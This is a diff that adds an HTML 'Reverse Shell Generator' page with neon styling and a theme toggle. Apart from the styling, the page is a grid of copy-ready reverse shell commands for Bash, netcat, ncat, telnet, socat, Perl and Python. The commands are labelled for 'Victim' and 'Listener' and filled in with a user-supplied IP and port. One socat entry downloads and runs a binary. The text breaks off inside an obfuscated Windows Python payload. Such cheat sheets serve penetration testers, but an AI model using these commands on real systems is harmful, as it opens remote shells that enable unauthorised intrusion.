@@ -1,0 +1,1123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Shell - Reverse Shell Generator</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Exo+2:wght@300;400;600&display=swap" rel="stylesheet">
+  <script>
+    function disableScrolling(){
+        var x=window.scrollX;
+        var y=window.scrollY;
+        window.onscroll=function(){window.scrollTo(x, y);};
+    }
+
+    function enableScrolling(){
+        window.onscroll=function(){};
+    }
+
+    function copy(item_id) {
+      disableScrolling();
+      var copyText = document.getElementById(item_id).textContent;
+      const textArea = document.getElementById('txt');
+      textArea.textContent = copyText;
+      textArea.select();
+      document.execCommand("copy");
+      enableScrolling();
+      
+      // Show notification
+      const notification = document.getElementById('copy-notification');
+      notification.style.display = 'block';
+      setTimeout(() => {
+        notification.style.display = 'none';
+      }, 2000);
+      
+      return false;
+    }
+    
+    // 主题切换功能
+    function toggleTheme() {
+      const body = document.body;
+      const isDark = body.classList.toggle('dark-mode');
+      
+      // 保存主题偏好到localStorage
+      localStorage.setItem('theme', isDark ? 'dark' : 'light');
+    }
+    
+    // 页面加载时检查主题偏好
+    document.addEventListener('DOMContentLoaded', function() {
+      const savedTheme = localStorage.getItem('theme');
+      const body = document.body;
+      
+      // 如果用户之前有偏好设置，则应用
+      if (savedTheme === 'light') {
+        body.classList.remove('dark-mode');
+      } else {
+        body.classList.add('dark-mode');
+      }
+      
+      // 初始化卡片动画
+      const cards = document.querySelectorAll('.card');
+      cards.forEach((card, index) => {
+        setTimeout(() => {
+          card.style.opacity = '1';
+          card.style.transform = 'translateY(0)';
+        }, 100 * index);
+      });
+    });
+  </script>
+  <style type="text/tailwindcss">
+    @layer utilities {
+      .content-auto {
+        content-visibility: auto;
+      }
+      .toggle-checkbox:checked {
+        right: 0;
+        border-color: #00f3ff;
+      }
+      .toggle-checkbox:checked + .toggle-label {
+        background-color: #00f3ff;
+      }
+    }
+  </style>
+  <style>
+    /* 基础样式 */
+    body {
+      transition: background-color 0.5s ease;
+    }
+    
+    /* 深色模式（默认） */
+    body.dark-mode {
+      --neon-blue: #ff42b3;
+      --neon-pink: #f5f5f5;
+      --neon-purple: #8780d9;
+      --neon-green: #00ff9d;
+      --dark-bg: #0a0a15;
+      --darker-bg: #05050f;
+      --card-bg: rgba(20, 10, 35, 0.7);
+      --text-light: #e0e0ff;
+      --text-neon: #a0f0ff;
+    }
+    
+    /* 浅色模式 */
+    body:not(.dark-mode) {
+      --neon-blue: #e195be;
+      --neon-pink: #cdcdc6;
+      --neon-purple: #d7b1c2;
+      --neon-green: #008040;
+      --dark-bg: #f5f5dc;
+      --darker-bg: #e8e8d0;
+      --card-bg: rgba(255, 255, 255, 0.7);
+      --text-light: #333333;
+      --text-neon: #0066cc;
+    }
+    
+    body:not(.dark-mode)::before {
+      background: 
+        linear-gradient(transparent 65%, rgba(240, 240, 220, 0.7) 90%),
+        repeating-linear-gradient(
+          0deg,
+          rgba(0, 102, 204, 0.05) 0px,
+          rgba(0, 102, 204, 0.05) 1px,
+          transparent 1px,
+          transparent 20px
+        );
+    }
+    
+    body:not(.dark-mode) .card {
+      background: var(--card-bg);
+      border: 1px solid rgba(0, 102, 204, 0.3);
+      box-shadow: 0 0 20px rgba(0, 102, 204, 0.1);
+    }
+    
+    body:not(.dark-mode) .card:hover {
+      box-shadow: 0 0 30px rgba(0, 102, 204, 0.3), 0 0 40px rgba(102, 0, 204, 0.2);
+      border-color: var(--neon-blue);
+    }
+    
+    body:not(.dark-mode) .card::before {
+      background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple), var(--neon-pink));
+    }
+    
+    body:not(.dark-mode) .header h1 {
+      background: linear-gradient(90deg, var(--neon-blue), var(--neon-pink), var(--neon-green));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 15px rgba(0, 102, 204, 0.5);
+    }
+    
+    body:not(.dark-mode) .header h1::after {
+      background: linear-gradient(90deg, var(--neon-blue), var(--neon-pink));
+      box-shadow: 0 0 10px var(--neon-blue);
+    }
+    
+    body:not(.dark-mode) input[type="text"] {
+      border: 1px solid rgba(0, 102, 204, 0.4);
+      background: rgba(240, 240, 240, 0.7);
+      color: var(--text-light);
+    }
+    
+    body:not(.dark-mode) input[type="text"]:focus {
+      border-color: var(--neon-blue);
+      box-shadow: 0 0 15px rgba(0, 102, 204, 0.4);
+    }
+    
+    body:not(.dark-mode) pre {
+      background: rgba(240, 240, 240, 0.9);
+      border: 1px solid rgba(0, 102, 204, 0.3);
+      color: #006600;
+    }
+    
+    body:not(.dark-mode) pre::before {
+      background: linear-gradient(to bottom, var(--neon-blue), var(--neon-pink));
+    }
+    
+    body:not(.dark-mode) .cyber-border.border-top {
+      background: linear-gradient(90deg, transparent, var(--neon-blue), var(--neon-pink), transparent);
+      box-shadow: 0 0 15px var(--neon-blue);
+    }
+    
+    body:not(.dark-mode) .cyber-border.border-right {
+      background: linear-gradient(transparent, var(--neon-pink), var(--neon-blue), transparent);
+      box-shadow: 0 0 15px var(--neon-pink);
+    }
+    
+    body:not(.dark-mode) .cyber-border.border-bottom {
+      background: linear-gradient(90deg, transparent, var(--neon-pink), var(--neon-blue), transparent);
+      box-shadow: 0 0 15px var(--neon-blue);
+    }
+    
+    body:not(.dark-mode) .cyber-border.border-left {
+      background: linear-gradient(transparent, var(--neon-blue), var(--neon-pink), transparent);
+      box-shadow: 0 0 15px var(--neon-pink);
+    }
+    
+    body:not(.dark-mode) button {
+      background: linear-gradient(45deg, var(--neon-purple), var(--neon-pink));
+      box-shadow: 0 0 10px rgba(102, 0, 204, 0.5);
+    }
+    
+    body:not(.dark-mode) button:hover {
+      box-shadow: 0 0 20px rgba(102, 0, 204, 0.8);
+      background: linear-gradient(45deg, var(--neon-pink), var(--neon-purple));
+    }
+    
+    body:not(.dark-mode) .section-label {
+      background: rgba(102, 0, 204, 0.2);
+      color: var(--neon-pink);
+      border: 1px solid var(--neon-purple);
+    }
+    
+    body:not(.dark-mode) #copy-notification {
+      background: rgba(240, 240, 240, 0.9);
+      color: var(--neon-green);
+      border: 1px solid var(--neon-green);
+      box-shadow: 0 0 20px rgba(0, 128, 64, 0.4);
+    }
+    
+    body:not(.dark-mode) .input-group {
+      background: rgba(240, 240, 240, 0.7);
+      border: 1px solid rgba(0, 102, 204, 0.2);
+      box-shadow: 0 0 15px rgba(0, 102, 204, 0.1);
+    }
+    
+    /* 主题切换开关样式 */
+    .theme-toggle {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .theme-toggle label {
+      cursor: pointer;
+      color: var(--text-light);
+      font-weight: 600;
+    }
+    
+    .toggle-switch {
+      position: relative;
+      display: inline-block;
+      width: 60px;
+      height: 30px;
+    }
+    
+    .toggle-switch input {
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+    
+    .toggle-slider {
+      position: absolute;
+      cursor: pointer;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: #ccc;
+      transition: .4s;
+      border-radius: 34px;
+    }
+    
+    .toggle-slider:before {
+      position: absolute;
+      content: "";
+      height: 22px;
+      width: 22px;
+      left: 4px;
+      bottom: 4px;
+      background-color: white;
+      transition: .4s;
+      border-radius: 50%;
+    }
+    
+    input:checked + .toggle-slider {
+      background-color: var(--neon-blue);
+    }
+    
+    input:focus + .toggle-slider {
+      box-shadow: 0 0 1px var(--neon-blue);
+    }
+    
+    input:checked + .toggle-slider:before {
+      transform: translateX(30px);
+    }
+    
+    /* 其他现有样式保持不变... */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Exo 2', sans-serif;
+      background-color: var(--dark-bg);
+      color: var(--text-light);
+      background-image: 
+        radial-gradient(circle at 10% 20%, rgba(189, 0, 255, 0.1) 0%, transparent 20%),
+        radial-gradient(circle at 90% 80%, rgba(0, 243, 255, 0.1) 0%, transparent 20%),
+        linear-gradient(to bottom, var(--darker-bg), #0f0a1f);
+      min-height: 100vh;
+      padding: 20px;
+      position: relative;
+      overflow-x: hidden;
+    }
+    
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: 
+        linear-gradient(transparent 65%, rgba(11, 0, 20, 0.7) 90%),
+        repeating-linear-gradient(
+          0deg,
+          rgba(0, 243, 255, 0.05) 0px,
+          rgba(0, 243, 255, 0.05) 1px,
+          transparent 1px,
+          transparent 20px
+        );
+      pointer-events: none;
+      z-index: -1;
+    }
+    
+    .header {
+      text-align: center;
+      margin: 20px 0 40px;
+      position: relative;
+      padding: 20px;
+    }
+    
+    .header h1 {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 3.2rem;
+      font-weight: 900;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      background: linear-gradient(90deg, var(--neon-blue), var(--neon-pink), var(--neon-green));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 15px rgba(0, 243, 255, 0.5);
+      margin-bottom: 10px;
+    }
+    
+    .header h1::after {
+      content: '';
+      display: block;
+      width: 150px;
+      height: 4px;
+      background: linear-gradient(90deg, var(--neon-blue), var(--neon-pink));
+      margin: 15px auto;
+      border-radius: 2px;
+      box-shadow: 0 0 10px var(--neon-blue);
+    }
+    
+    .header p {
+      font-size: 1.2rem;
+      max-width: 700px;
+      margin: 0 auto;
+      line-height: 1.6;
+      color: var(--text-neon);
+    }
+    
+    .grid-container {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+      gap: 25px;
+      max-width: 1800px;
+      margin: 0 auto;
+    }
+    
+    .card {
+      background: var(--card-bg);
+      border: 1px solid rgba(0, 243, 255, 0.3);
+      border-radius: 12px;
+      padding: 25px;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0 20px rgba(0, 243, 255, 0.1);
+      transition: all 0.3s ease;
+      backdrop-filter: blur(5px);
+      opacity: 0;
+      transform: translateY(20px);
+    }
+    
+    .card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 0 30px rgba(0, 243, 255, 0.3), 0 0 40px rgba(189, 0, 255, 0.2);
+      border-color: var(--neon-blue);
+    }
+    
+    .card::before {
+      content: '';
+      position: absolute;
+      top: -2px;
+      left: -2px;
+      right: -2px;
+      bottom: -2px;
+      background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple), var(--neon-pink));
+      z-index: -1;
+      border-radius: 14px;
+    }
+    
+    .card h3 {
+      font-family: 'Orbitron', sans-serif;
+      color: var(--neon-blue);
+      margin-bottom: 20px;
+      font-size: 1.6rem;
+      display: flex;
+      align-items: center;
+    }
+    
+    .card h3 i {
+      margin-right: 10px;
+      color: var(--neon-pink);
+    }
+    
+    .input-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 15px;
+      margin-bottom: 30px;
+      background: rgba(10, 15, 30, 0.7);
+      padding: 20px;
+      border-radius: 10px;
+      border: 1px solid rgba(0, 243, 255, 0.2);
+      box-shadow: 0 0 15px rgba(0, 243, 255, 0.1);
+    }
+    
+    .input-container {
+      flex: 1;
+      min-width: 200px;
+    }
+    
+    .input-container label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 600;
+      color: var(--neon-green);
+      font-size: 1.1rem;
+    }
+    
+    input[type="text"] {
+      width: 100%;
+      padding: 12px 15px;
+      border: 1px solid rgba(0, 243, 255, 0.4);
+      background: rgba(5, 10, 20, 0.7);
+      color: var(--text-light);
+      font-size: 1.1rem;
+      border-radius: 6px;
+      transition: all 0.3s ease;
+    }
+    
+    input[type="text"]:focus {
+      outline: none;
+      border-color: var(--neon-blue);
+      box-shadow: 0 0 15px rgba(0, 243, 255, 0.4);
+    }
+    
+    input[type="submit"], input[type="reset"] {
+      background: linear-gradient(45deg, #ffffff, #1a0a3a);
+      color: var(--text-light);
+      border: none;
+      padding: 12px 25px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      border-radius: 6px;
+      cursor: pointer;
+      border: 1px solid var(--neon-purple);
+      transition: all 0.3s ease;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      font-family: 'Exo 2', sans-serif;
+      margin-top: 28px;
+    }
+    
+    input[type="submit"] {
+      background: linear-gradient(45deg, #ffffff, #0a0a3a);
+      border: 1px solid var(--neon-blue);
+    }
+    
+    input[type="submit"]:hover, input[type="reset"]:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 0 15px rgba(0, 243, 255, 0.4);
+    }
+    
+    input[type="submit"]:hover {
+      background: linear-gradient(45deg, #0a3a4a, #ffffff);
+    }
+    
+    input[type="reset"]:hover {
+      background: linear-gradient(45deg, #3a0a2a, #ffffff);
+    }
+    
+    pre {
+      font-family: 'Courier New', monospace;
+      font-size: 14px;
+      background: rgba(5, 5, 15, 0.9);
+      overflow: auto;
+      border: 1px solid rgba(0, 243, 255, 0.3);
+      padding: 15px;
+      border-radius: 8px;
+      color: var(--neon-green);
+      line-height: 1.5;
+      margin: 15px 0;
+      position: relative;
+      box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.5);
+      max-height: 200px;
+    }
+    
+    pre::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 4px;
+      height: 100%;
+      background: linear-gradient(to bottom, var(--neon-blue), var(--neon-pink));
+      border-radius: 4px 0 0 4px;
+    }
+    
+    button {
+      background: linear-gradient(45deg, var(--neon-purple), var(--neon-pink));
+      color: white;
+      border: none;
+      padding: 8px 20px;
+      font-size: 14px;
+      font-weight: 600;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      font-family: 'Exo 2', sans-serif;
+      box-shadow: 0 0 10px rgba(189, 0, 255, 0.5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin: 5px 0 15px;
+    }
+    
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 0 20px rgba(189, 0, 255, 0.8);
+      background: linear-gradient(45deg, var(--neon-pink), var(--neon-purple));
+    }
+    
+    button i {
+      font-size: 14px;
+    }
+    
+    .section-label {
+      display: inline-block;
+      background: rgba(189, 0, 255, 0.2);
+      padding: 5px 12px;
+      border-radius: 20px;
+      font-size: 13px;
+      margin: 10px 0 5px;
+      color: var(--neon-pink);
+      border: 1px solid var(--neon-purple);
+    }
+    
+    textarea {
+      position: fixed;
+      left: -100%;
+    }
+    
+    #copy-notification {
+      position: fixed;
+      bottom: 30px;
+      right: 30px;
+      background: rgba(10, 20, 30, 0.9);
+      color: var(--neon-green);
+      padding: 15px 25px;
+      border-radius: 8px;
+      border: 1px solid var(--neon-green);
+      box-shadow: 0 0 20px rgba(0, 255, 157, 0.4);
+      font-size: 16px;
+      display: none;
+      z-index: 1000;
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0% { box-shadow: 0 0 10px rgba(0, 255, 157, 0.4); }
+      50% { box-shadow: 0 0 25px rgba(0, 255, 157, 0.7); }
+      100% { box-shadow: 0 0 10px rgba(0, 255, 157, 0.4); }
+    }
+    
+    .cyber-border {
+      position: absolute;
+      pointer-events: none;
+    }
+    
+    .border-top {
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: linear-gradient(90deg, transparent, var(--neon-blue), var(--neon-pink), transparent);
+      box-shadow: 0 0 15px var(--neon-blue);
+    }
+    
+    .border-right {
+      top: 0;
+      right: 0;
+      bottom: 0;
+      width: 3px;
+      background: linear-gradient(transparent, var(--neon-pink), var(--neon-blue), transparent);
+      box-shadow: 0 0 15px var(--neon-pink);
+    }
+    
+    .border-bottom {
+      left: 0;
+      right: 0;
+      bottom: 0;
+      height: 3px;
+      background: linear-gradient(90deg, transparent, var(--neon-pink), var(--neon-blue), transparent);
+      box-shadow: 0 0 15px var(--neon-blue);
+    }
+    
+    .border-left {
+      top: 0;
+      left: 0;
+      bottom: 0;
+      width: 3px;
+      background: linear-gradient(transparent, var(--neon-blue), var(--neon-pink), transparent);
+      box-shadow: 0 0 15px var(--neon-pink);
+    }
+    
+    .terminal-line {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 60px;
+      background: linear-gradient(transparent, rgba(0, 243, 255, 0.05));
+      pointer-events: none;
+      z-index: -1;
+    }
+    
+    .glow {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      background: radial-gradient(circle at center, rgba(0, 243, 255, 0.1) 0%, transparent 60%);
+      pointer-events: none;
+      z-index: -1;
+    }
+    
+    @media (max-width: 768px) {
+      .header h1 {
+        font-size: 2.5rem;
+      }
+      
+      .grid-container {
+        grid-template-columns: 1fr;
+      }
+      
+      .input-group {
+        flex-direction: column;
+      }
+      
+      input[type="submit"], input[type="reset"] {
+        margin-top: 15px;
+        width: 100%;
+      }
+      
+      .theme-toggle {
+        top: 10px;
+        right: 10px;
+      }
+    }
+  </style>
+</head>
+<body class="dark-mode">
+  <div class="cyber-border border-top"></div>
+  <div class="cyber-border border-right"></div>
+  <div class="cyber-border border-bottom"></div>
+  <div class="cyber-border border-left"></div>
+  <div class="glow"></div>
+  <div class="terminal-line"></div>
+  
+  <!-- 主题切换开关 -->
+  <div class="theme-toggle">
+    <label for="theme-toggle"><i class="fas fa-moon"></i></label>
+    <label class="toggle-switch">
+      <input type="checkbox" id="theme-toggle" onclick="toggleTheme()" checked>
+      <span class="toggle-slider"></span>
+    </label>
+    <label for="theme-toggle"><i class="fas fa-sun"></i></label>
+  </div>
+  
+  <div class="header">
+    <h1><i class="fas fa-terminal"></i>REVERSE SHELL</h1>
+    <p>Advanced Reverse Shell Generator for Cybersecurity Professionals</p>
+  </div>
+  
+  <div class="input-group">
+    <div class="input-container">
+      <label for="ip"><i class="fas fa-network-wired"></i> IP ADDRESS</label>
+      <input type="text" id="ip" value="127.0.0.1" name="ip">
+    </div>
+    
+    <div class="input-container">
+      <label for="port"><i class="fas fa-plug"></i> PORT</label>
+      <input type="text" id="port" value="8080" name="port">
+    </div>
+    
+    <input type="submit" value="Apply Changes" onclick="myFunction()">
+    <input type="reset" value="Reset Settings" onclick="myFunction2()">
+  </div>
+  
+  <script>
+    function myFunction(){
+      var ip = document.getElementById("ip").value;
+      var port = document.getElementById("port").value;
+      console.log(ip);
+      console.log(port);
+      var html= document.body.innerHTML;
+      html=html.replace(/127\.0\.0\.1/g,ip);           
+      html=html.replace(/8080/g,port);
+      document.body.innerHTML=html;
+    }
+    
+    function myFunction2(){
+      location.reload();
+    }
+  </script>
+  
+  <div id="copy-notification">
+    <i class="fas fa-check-circle"></i> Command copied to clipboard!
+  </div>
+  
+  <textarea id="txt"></textarea>
+  
+  <div class="grid-container">
+    <!-- Bash TCP -->
+    <div class="card">
+      <h3><i class="fas fa-code"></i> Bash TCP</h3>
+      <span class="section-label">Victim</span>
+      <pre id="cmd001">bash -i >& /dev/tcp/127.0.0.1/8080 0>&1</pre>
+      <button onclick="copy('cmd001')"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="cmd002">/bin/bash -i > /dev/tcp/127.0.0.1/8080 0<& 2>&1</pre>
+      <button onclick="copy('cmd002');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="cmd003">exec 5<>/dev/tcp/127.0.0.1/8080;cat <&5 | while read line; do $line 2>&5 >&5; done</pre>
+      <button onclick="copy('cmd003');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="cmd004">exec /bin/sh 0&lt;/dev/tcp/127.0.0.1/8080 1>&0 2>&0</pre>
+      <button onclick="copy('cmd004');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="cmd005">0<&196;exec 196<>/dev/tcp/127.0.0.1/8080; sh <&196 >&196 2>&196</pre>
+      <button onclick="copy('cmd005');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- 其他卡片保持不变... -->
+    <!-- Bash UDP -->
+    <div class="card">
+      <h3><i class="fas fa-wifi"></i> Bash UDP</h3>
+      <span class="section-label">Victim</span>
+      <pre id="cmd006">sh -i >& /dev/udp/127.0.0.1/8080 0>&1</pre>
+      <button onclick="copy('cmd006');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <span class="section-label">Listener</span>
+      <pre id="cmd007">nc -u -lvp 8080</pre>
+      <button onclick="copy('cmd007');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- Netcat -->
+    <div class="card">
+      <h3><i class="fas fa-project-diagram"></i> Netcat</h3>
+      <pre id="nc01">nc -e /bin/sh 127.0.0.1 8080</pre>
+      <button onclick="copy('nc01');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="nc02">nc -e /bin/bash 127.0.0.1 8080</pre>
+      <button onclick="copy('nc02');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="nc03">nc -c bash 127.0.0.1 8080</pre>
+      <button onclick="copy('nc03');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="nc04">mknod backpipe p && nc 127.0.0.1 8080 0&lt;backpipe | /bin/bash 1>backpipe </pre>
+      <button onclick="copy('nc04');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="nc05">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 8080 >/tmp/f</pre>
+      <button onclick="copy('nc05');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="nc06">rm -f /tmp/p; mknod /tmp/p p && nc 127.0.0.1 8080 0/tmp/p 2>&1</pre>
+      <button onclick="copy('nc06');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="nc07">rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 127.0.0.1 8080 > f</pre>
+      <button onclick="copy('nc07');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="nc08">rm -f x; mknod x p && nc 127.0.0.1 8080 0&lt;x | /bin/bash 1>x</pre>
+      <button onclick="copy('nc08');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- 其余代码保持不变... -->
+    <!-- 后续所有卡片内容保持不变... -->
+    <!-- Ncat -->
+    <div class="card">
+      <h3><i class="fas fa-exchange-alt"></i> Ncat</h3>
+      <pre id="ncat01">ncat 127.0.0.1 8080 -e /bin/bash</pre>
+      <button onclick="copy('ncat01');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="ncat02">ncat --udp 127.0.0.1 8080 -e /bin/bash</pre>
+      <button onclick="copy('ncat02');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- Telnet -->
+    <div class="card">
+      <h3><i class="fas fa-ethernet"></i> Telnet</h3>
+      <pre id="telnet01">rm -f /tmp/p; mknod /tmp/p p && telnet 127.0.0.1 8080 0/tmp/p 2>&1</pre>
+      <button onclick="copy('telnet01');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="telnet02">telnet 127.0.0.1 8080 | /bin/bash | telnet 127.0.0.1 444</pre>
+      <button onclick="copy('telnet02');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="telnet03">rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet 127.0.0.1 8080 > f</pre>
+      <button onclick="copy('telnet03');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="telnet04">rm -f x; mknod x p && telnet 127.0.0.1 8080 0&lt;x | /bin/bash 1>x</pre>
+      <button onclick="copy('telnet04');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- Socat -->
+    <div class="card">
+      <h3><i class="fas fa-link"></i> Socat</h3>
+      <span class="section-label">Victim</span>
+      <pre id="socat01">/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:8080</pre>
+      <button onclick="copy('socat01');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="socat02">socat tcp-connect:127.0.0.1:8080 exec:"bash -li",pty,stderr,setsid,sigint,sane</pre>
+      <button onclick="copy('socat02');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <span class="section-label">Listener</span>
+      <pre id="socat03">socat file:`tty`,raw,echo=0 TCP-L:8080</pre>
+      <button onclick="copy('socat03');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <span class="section-label">Victim</span>
+      <pre id="socat04">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:8080</pre>
+      <button onclick="copy('socat04');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- Perl -->
+    <div class="card">
+      <h3><i class="fab fa-perl"></i> Perl</h3>
+      <span class="section-label">Victim</span>
+      <pre id="perl01">perl -e 'use Socket;$i="127.0.0.1";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</pre>
+      <button onclick="copy('perl01');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="perl02">perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"127.0.0.1:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'</pre>
+      <button onclick="copy('perl02');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <span class="section-label">Windows only, Victim</span>
+      <pre id="perl03">perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"127.0.0.1:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'</pre>
+      <button onclick="copy('perl03');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- Python -->
+    <div class="card">
+      <h3><i class="fab fa-python"></i> Python</h3>
+      <span class="section-label">IP v4</span>
+      <pre id="python01">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
+      <button onclick="copy('python01');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="python02">export RHOST="127.0.0.1";export RPORT=8080;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</pre>
+      <button onclick="copy('python02');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="python03">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</pre>
+      <button onclick="copy('python03');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <span class="section-label">IP v6</span>
+      <pre id="python04">python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",8080,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'</pre>
+      <button onclick="copy('python04');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <span class="section-label">Windows only</span>
+      <pre id="python05">C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('127.0.0.1', 8080)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in 